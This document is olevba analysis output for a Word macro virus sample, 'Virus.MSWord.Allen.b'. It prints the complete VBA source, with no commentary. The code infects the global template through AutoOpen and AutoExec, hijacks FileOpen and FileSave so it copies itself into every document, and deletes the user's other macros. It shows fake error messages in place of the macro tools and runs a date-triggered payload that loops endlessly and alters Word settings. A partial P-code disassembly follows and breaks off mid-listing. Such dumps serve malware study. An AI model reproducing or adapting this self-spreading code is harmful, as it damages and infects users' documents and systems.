olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Allen.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiToolsCustomize.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiToolsCustomize'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Customizes the Word user interface (menus, keyboard and toolbars)"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiToolsCustomize.MAIN"
Dim Tiwi$
Tiwi$ = "No such customize or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileTemplates.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiFileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileTemplates.MAIN"
Dim Tiwi$
Tiwi$ = "No such template or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiToolsMacro.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiToolsMacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiToolsMacro.MAIN"
Dim Tiwi$
Tiwi$ = "No such macro or command."
    WordBasic.MsgBox Tiwi$, "Microsoft Word Error", 48
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileSaveAs.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiFileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileSaveAs.MAIN"
Dim NFile$
Dim NMakro$
On Error GoTo -1: On Error GoTo Pratiwi
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
    dlg.Format = 1
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSaveAs dlg
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoClose.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiAutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoClose.MAIN"
Dim Intan
Dim i
Dim MN$
ReDim Fransiska__$(20)
Intan = 0
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) <> "FileOpen" Then GoTo Pakis
        On Error GoTo -1: On Error GoTo Pratiwi
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
        On Error GoTo -1: On Error GoTo Pratiwi
        WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", "Global:FileOpen"
Pakis:
    Next i
End If
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileSave.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiFileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileSave.MAIN"
Dim NFile$
Dim NMakro$
On Error GoTo -1: On Error GoTo Pratiwi
WordBasic.FileSave
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
    dlg.Format = 1
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSaveAs dlg
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiFileOpen.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiFileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Opens an existing document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiFileOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim FN$
Dim NFile$
Dim NMakro$
WordBasic.DisableAutoMacros 1
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
On Error GoTo -1: On Error GoTo Pratiwi
WordBasic.Dialog.FileOpen dlg
WordBasic.FileOpen dlg
ReDim Fransiska__$(20)
Intan = 0
For i = 1 To WordBasic.CountMacros(1)
    MN$ = WordBasic.[MacroName$](i, 1)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
FN$ = WordBasic.[FileName$]()
If Intan >= 1 Then
    For i = 1 To Intan
        WordBasic.Organizer Delete:=1, Source:=FN$, Name:=Fransiska__$(i), Tab:=3
    Next i
WordBasic.FileSave
End If
NFile$ = WordBasic.[FileName$]()
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1, LockAnnot:=0, Password:="", AddToMru:=1, WritePassword:="", RecommendReadOnly:=0, EmbedFonts:=0, NativePictureFormat:=0, FormsData:=0
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy "Global:SweetPakisPratiwi", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoExec", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":AutoOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy "Global:PakisPratiwiAutoClose", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy "Global:PakisPratiwiFileOpen", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSave", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy "Global:PakisPratiwiFileSaveAs", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy "Global:PakisPratiwiFileTemplates", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsMacro", NMakro$
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy "Global:PakisPratiwiToolsCustomize", NMakro$
    WordBasic.FileSave
Pratiwi:
WordBasic.DisableAutoMacros 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoOpen.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiAutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim NFile$
Dim NMakro$
ReDim Fransiska__$(20)
Intan = 0
On Error GoTo -1: On Error GoTo Pratiwi
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) = "FileOpen" Then GoTo Pakis
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
Pakis:
    Next i
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy NMakro$, "Global:SweetPakisPratiwi"
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:AutoClose"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileOpen"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO PakisPratiwiAutoExec.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/PakisPratiwiAutoExec'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.PakisPratiwiAutoExec.MAIN"
Dim Tgl
Dim Bln
Dim Thn
Dim Jam
Dim Lebar
Dim Tinggi
Dim BarOK
Dim LebOK
WordBasic.DisableInput 1
WordBasic.DisableAutoMacros 0
Tgl = WordBasic.Day(WordBasic.Now())
Bln = WordBasic.Month(WordBasic.Now())
Thn = WordBasic.Year(WordBasic.Now())
Jam = WordBasic.Hour(WordBasic.Now())
Dim Tiwi1$, Tiwi2$, Tiwi3$, Tiwi4$, Pelaku$, Pakis$
Tiwi1$ = "Berawal dari sebuah kepedihan..." + Chr(13) + "Aku dicampakkan dan dihinakan..." + Chr(13) + "Terpuruk bagaikan sampah busuk..." + Chr(13) + "Aku merintih..." + Chr(13) + "   ( dengan segumpal dendam mendidih )"
Tiwi2$ = "Kini saatnya Aku menunjukkan..." + Chr(13) + "Masih adanya sebuah kekuatan..." + Chr(13) + "Membungkam mulut-mulut tak berperasaan..." + Chr(13) + "Sebab hasrat untuk menjadi yang terbaik..." + Chr(13) + "Adalah sesuatu yang sangat manusiawi..." + Chr(13) + "Aku menangis harus melibatkan semua orang."
Tiwi3$ = "©1997 Aku ( yang selalu terpuruk ... )"
Pakis$ = "Pakis Pratiwi"
If Thn < 1998 Then GoTo Fransiska
If Jam < 19 Then GoTo Pratiwi
Dim dlg As Object
    Lebar = 400
    Tinggi = 200
    BarOK = Tinggi - 25
    LebOK = Lebar - 40
    WordBasic.BeginDialog Lebar, Tinggi, " Come to where the fucker is ... "
        WordBasic.Text 20, 10, LebOK, 150, Tiwi1$
        WordBasic.Text 20, 78, LebOK, 120, Tiwi2$
        WordBasic.Text 20, 160, LebOK, 20, Tiwi3$
        WordBasic.OKButton 20, BarOK, LebOK, 20
    WordBasic.EndDialog
Set dlg = WordBasic.CurValues.UserDialog
WordBasic.Dialog.UserDialog dlg
Fransiska:
If Tgl = 19 And Bln = 8 Then
    Pelaku$ = Pakis$
    GoTo Intan
End If
GoTo Pakis_
Intan:
    Tiwi4$ = "Buat : " + Pelaku$ + " ( dimanapun kamu ! )" + Chr(13) + Chr(13) + "     Selamat ya !!!" + Chr(13) + "          Tambah umur..." + Chr(13) + "          Tambah dewasa..." + Chr(13) + "     Tambah cakep..." + Chr(13) + Chr(13) + "Dari : Aku ( yang peduli sama kamu ! )"

    WordBasic.Beep
    WordBasic.MsgBox Tiwi4$, "Happy Birthday, " + Pelaku$ + "...", 16
    GoTo Intan
Pakis_:
WordBasic.ToolsOptionsSave CreateBackup:=0, FastSaves:=0, SummaryPrompt:=0, GlobalDotPrompt:=0, NativePictureFormat:=0, EmbedFonts:=0, FormsData:=0, AutoSave:=1, SaveInterval:="5", Password:="", WritePassword:="", RecommendReadOnly:=0
WordBasic.ToolsOptionsGeneral Pagination:=1, WPHelp:=0, WPDocNavKeys:=0, BlueScreen:=0, ErrorBeeps:=1, Effects3d:=1, UpdateLinks:=1, SendMailAttach:=1, RecentFiles:=0, RecentFileCount:="", Units:=1, ButtonFieldClicks:=-1
WordBasic.ToolsOptionsUserInfo Name:="Pakis Pratiwi", Initials:="Tiwi", Address:="Pupus sudah asa Aku mencari" + Chr(13) + "Alamat nyata belum jua terberi" + Chr(13) + "Kalau saudaraku sudi memberi" + Chr(13) + "Informasi Aku menanti" + Chr(13) + "Seribu hatur kasih Aku pasti"
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO SweetPakisPratiwi.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/SweetPakisPratiwi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.SweetPakisPratiwi.MAIN"
'
'Cuplikan diary ini adalah kejadian nyata perjalanan hidupku.
'Satu harapan besarku, semoga Tiwi tahu segala perasaanku.
'Semoga...
'
'============================================='
'Catatan :                                  '
'Beberapa bagian dari diary ini telah disensor'
'tanpa mengurangi makna dan isinya.           '
'============================================='
'-------------------------------
'Date : July 5, 1995
'Time : 9:08 p.m.
'Pagi  test ********, kelihatannya suksessss... ketemu sama  ****,
'Sorenya  latihan  ke *********, kemudian ke  ****,  pertama  kali
'ketemu  sama  Tiwi (katanya adiknya *****  (?))...  dianya  manis
'lho.... swear!
'-------------------------------
'Date : July 9, 1995
'Time : 8:11 p.m.
'Tragedi  ******... Dapet juara *, Rp *****,-...  penempatan  kaki
'kurang bagus... kenalan sama Tiwi, adiknya *****. Sekarang  ngan-
'tuk !!!
'-------------------------------
'Date : August 30, 1995
'Time : 7:15 p.m.
'Nggak  ada  yang berkesan di hari ini selain sepi  dan  sepi  dan
'sepi...  Ah nasib. Tapi mengapa aku harus menyesali nasib ?  Yang
'jelas aku masih menyimpan rasa sayang sama Tiwi. Itu saja.
'-------------------------------
'Date : March 21, 1996
'Time : 8:53 p.m.
'Nelpon  ****  nggak ada, nelpon Tiwi udah bobo',  ya  udah  dech,
'sekarang belajar... biar besok sukses !!! Semoga.
'*** Buat apa sih hidup terlalu lurus ????? ***
'*** Karena hidup nggak sesederhana itu !!! ***
'*** Sekali-kali jadi bajingan apa salahnya ???? ***
'-------------------------------
'Date : August 19, 1996
'Time : 8:33 p.m.
'Hari ini Tiwi ulang tahun yang ke **... selamat ya !!!
'Tambah umur...
'Tambah dewasa...
'Tambah cakep...
'... OK ! ...
'Selainnya itu ... nggak ada temen... sepi !!!
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "From Aku with Love. \r\nJust for Pakis Pratiwi... wherever you are !"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim Intan
Dim i
Dim MN$
Dim NFile$
Dim NMakro$
ReDim Fransiska__$(20)
Intan = 0
On Error GoTo -1: On Error GoTo Pratiwi
For i = 1 To WordBasic.CountMacros(0)
    MN$ = WordBasic.[MacroName$](i, 0)
    Fransiska__$(i) = MN$
    Intan = Intan + 1
Next i
If Intan >= 1 Then
    For i = 1 To Intan
        If Fransiska__$(i) = "FileOpen" Then GoTo Pakis
        WordBasic.Organizer Delete:=1, Source:="NORMAL.DOT", Name:=Fransiska__$(i), Tab:=3
Pakis:
    Next i
End If
NFile$ = WordBasic.[FileName$]()
    NMakro$ = NFile$ + ":SweetPakisPratiwi"
    WordBasic.MacroCopy NMakro$, "Global:SweetPakisPratiwi"
    NMakro$ = NFile$ + ":PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSave"
    WordBasic.MacroCopy NMakro$, "Global:FileSave"
    NMakro$ = NFile$ + ":PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileSaveAs"
    WordBasic.MacroCopy NMakro$, "Global:FileSaveAs"
    NMakro$ = NFile$ + ":PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileTemplates"
    WordBasic.MacroCopy NMakro$, "Global:FileTemplates"
    NMakro$ = NFile$ + ":PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsMacro"
    WordBasic.MacroCopy NMakro$, "Global:ToolsMacro"
    NMakro$ = NFile$ + ":PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiToolsCustomize"
    WordBasic.MacroCopy NMakro$, "Global:ToolsCustomize"
    NMakro$ = NFile$ + ":PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoExec"
    WordBasic.MacroCopy NMakro$, "Global:AutoExec"
    NMakro$ = NFile$ + ":PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoClose"
    WordBasic.MacroCopy NMakro$, "Global:AutoClose"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiAutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:PakisPratiwiFileOpen"
    NMakro$ = NFile$ + ":PakisPratiwiAutoOpen"
    WordBasic.MacroCopy NMakro$, "Global:AutoOpen"
    NMakro$ = NFile$ + ":PakisPratiwiFileOpen"
    WordBasic.MacroCopy NMakro$, "Global:FileOpen"
Pratiwi:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Allen.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/PakisPratiwiToolsCustomize - 1488 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Tiwi
' Line #3:
' 	LitStr 0x001D "No such customize or command."
' 	St Tiwi$ 
' Line #4:
' 	Ld Tiwi$ 
' 	LitStr 0x0014 "Microsoft Word Error"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/PakisPratiwiFileTemplates - 1431 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Tiwi
' Line #3:
' 	LitStr 0x001C "No such template or command."
' 	St Tiwi$ 
' Line #4:
' 	Ld Tiwi$ 
' 	LitStr 0x0014 "Microsoft Word Error"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/PakisPratiwiToolsMacro - 1427 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Tiwi
' Line #3:
' 	LitStr 0x0019 "No such macro or command."
' 	St Tiwi$ 
' Line #4:
' 	Ld Tiwi$ 
' 	LitStr 0x0014 "Microsoft Word Error"
' 	LitDI2 0x0030 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #5:
' 	EndSub 
' Macros/VBA/PakisPratiwiFileSaveAs - 3178 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn NFile
' Line #3:
' 	Dim 
' 	VarDefn NMakro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Pratiwi 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #8:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #9:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St NFile$ 
' Line #10:
' 	Ld NFile$ 
' 	LitStr 0x0012 ":SweetPakisPratiwi"
' 	Add 
' 	St NMakro$ 
' Line #11:
' 	LitStr 0x0018 "Global:SweetPakisPratiwi"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoExec"
' 	Add 
' 	St NMakro$ 
' Line #13:
' 	LitStr 0x001B "Global:PakisPratiwiAutoExec"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiAutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #15:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld NFile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St NMakro$ 
' Line #17:
' 	LitStr 0x001B "Global:PakisPratiwiAutoOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld NFile$ 
' 	LitStr 0x0016 ":PakisPratiwiAutoClose"
' 	Add 
' 	St NMakro$ 
' Line #19:
' 	LitStr 0x001C "Global:PakisPratiwiAutoClose"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileOpen"
' 	Add 
' 	St NMakro$ 
' Line #21:
' 	LitStr 0x001B "Global:PakisPratiwiFileOpen"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld NFile$ 
' 	LitStr 0x0015 ":PakisPratiwiFileSave"
' 	Add 
' 	St NMakro$ 
' Line #23:
' 	LitStr 0x001B "Global:PakisPratiwiFileSave"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiFileSaveAs"
' 	Add 
' 	St NMakro$ 
' Line #25:
' 	LitStr 0x001D "Global:PakisPratiwiFileSaveAs"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld NFile$ 
' 	LitStr 0x001A ":PakisPratiwiFileTemplates"
' 	Add 
' 	St NMakro$ 
' Line #27:
' 	LitStr 0x0020 "Global:PakisPratiwiFileTemplates"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #28:
' 	Ld NFile$ 
' 	LitStr 0x0017 ":PakisPratiwiToolsMacro"
' 	Add 
' 	St NMakro$ 
' Line #29:
' 	LitStr 0x001D "Global:PakisPratiwiToolsMacro"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Ld NFile$ 
' 	LitStr 0x001B ":PakisPratiwiToolsCustomize"
' 	Add 
' 	St NMakro$ 
' Line #31:
' 	LitStr 0x0021 "Global:PakisPratiwiToolsCustomize"
' 	Ld NMakro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #32:
' 	Ld dlg 
